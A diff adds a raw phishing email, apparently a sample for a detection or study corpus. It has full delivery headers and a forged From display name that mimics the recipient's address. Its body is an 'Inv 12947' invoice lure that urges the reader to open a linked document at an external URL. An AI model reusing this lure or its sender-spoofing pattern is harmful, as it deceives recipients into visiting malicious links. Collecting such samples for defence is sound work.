@@ -1,0 +1,66 @@
+ARC-Authentication-Results: i=1; abrooks@b2i1qfhdnp.net;
+       dkim=pass header.i=@6spitkjx19.org header.s=BA6F8ECC-01AB-11EA-87F3-12985E944E06 header.b=aThDp5xb;
+       spf=pass (abrooks@b2i1qfhdnp.net: domain of gmarchan@6spitkjx19.org designates 190.81.47.149 as permitted sender) smtp.mailfrom=gmarchan@6spitkjx19.org;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=6spitkjx19.org
+Return-Path: <gmarchan@6spitkjx19.org>
+Received: from hf7toq0trx.edu ([190.81.47.149])
+        by abrooks@b2i1qfhdnp.net with ESMTPS id o11si17658036yba.56.2020.07.20.12.35.58
+        for abrooks@b2i1qfhdnp.net
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Mon, 20 Jul 2020 12:35:59 -0700 (PDT)
+Received-SPF: pass (abrooks@b2i1qfhdnp.net: domain of gmarchan@6spitkjx19.org designates 190.81.47.149 as permitted sender) client-ip=190.81.47.149;
+Authentication-Results:abrooks@b2i1qfhdnp.net;
+       dkim=pass header.i=@6spitkjx19.org header.s=BA6F8ECC-01AB-11EA-87F3-12985E944E06 header.b=aThDp5xb;
+       spf=pass (abrooks@b2i1qfhdnp.net: domain of gmarchan@6spitkjx19.org designates 190.81.47.149 as permitted sender) smtp.mailfrom=gmarchan@6spitkjx19.org;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=6spitkjx19.org
+Received: from localhost (localhost [127.0.0.1])
+	by hf7toq0trx.edu (Postfix) with ESMTP id D082F4125D458
+	for abrooks@b2i1qfhdnp.net; Mon, 20 Jul 2020 14:35:57 -0500 (-05)
+Received: from hf7toq0trx.edu ([127.0.0.1])
+	by localhost (hf7toq0trx.edu [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id H1IpMNLvwqhP for [recipient's email domain];
+	Mon, 20 Jul 2020 14:35:57 -0500 (-05)
+Received: from localhost (localhost [127.0.0.1])
+	by hf7toq0trx.edu (Postfix) with ESMTP id ADC5A412603B3
+	for abrooks@b2i1qfhdnp.net; Mon, 20 Jul 2020 14:35:57 -0500 (-05)
+DKIM-Filter: OpenDKIM Filter v2.10.3 hf7toq0trx.edu ADC5A412603B3
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=6spitkjx19.org;
+	s=BA6F8ECC-01AB-11EA-87F3-12985E944E06; t=1595273757;
+	bh=yIKbVJJ4qCxZNb91PgBZM62pqkv/Uzi8NVe9x+izW4s=;
+	h=Date:From:To:MIME-Version:Message-Id;
+	b=aThDp5xbSvFu7fqxb+//fRhFj8Qn5E1xxwIIhZmAfQ+RO4ElD1SKl05bdjtK92pFx
+	 19ZoTPoCQMsctYhwA9wUnAgpyPEUnB8vdYF9xyArlAuFr0q8Qtv9BN1r9ho/fwphpe
+	 2sBnaefGZItbIEcs9vp31qMSoIRJVbIrrTzqCISlEyrcEBaPMO5niTzrYT9Lv+KnQu
+	 ue50UlnHNXS5B4xG1CtZamylwbdyl875FWpBItezWIcWtuIIz5YmnNmAamtyxeyLiF
+	 zQ4mKq2RdlD2Ta/sbqkcpvWP59RJl/R3D54hXVB+CXz2lzVR1N6Vqd9OezInqE5jQQ
+	 7MgPRWK6Bq7oQ==
+X-Virus-Scanned: amavisd-new at 6spitkjx19.org
+Received: from hf7toq0trx.edu ([127.0.0.1])
+	by localhost (hf7toq0trx.edu [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id ZMDq40n1-ecs for abrooks@b2i1qfhdnp.net;
+	Mon, 20 Jul 2020 14:35:57 -0500 (-05)
+Received: from [190.104.2.122] (unknown [190.104.2.122])
+	(Authenticated sender: gmarchan@6spitkjx19.org)
+	by hf7toq0trx.edu (Postfix) with ESMTPSA id 0470D4125D458
+	for abrooks@b2i1qfhdnp.net; Mon, 20 Jul 2020 14:35:56 -0500 (-05)
+Date: Mon, 20 Jul 2020 15:35:57 -0400
+From: "abrooks@b2i1qfhdnp.net <abrooks@b2i1qfhdnp.net@abrooks@b2i1qfhdnp.net>" <gmarchan@6spitkjx19.org>
+To: abrooks@b2i1qfhdnp.net
+Subject: Inv 12947 from [recipient's email domain]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Message-Id: <20200720193557.0470D4125D458@hf7toq0trx.edu>
+
+<html>
+<body>
+Please open the attached document.=0D
+<br>
+<br>
+<a href=3D"https://ezselika.com/test/k3d0-zl-8781/">https://ezselika.com/te=
+st/k3d0-zl-8781/</a>
+<br>
+<br>
+=0D
+</body>
+</html>
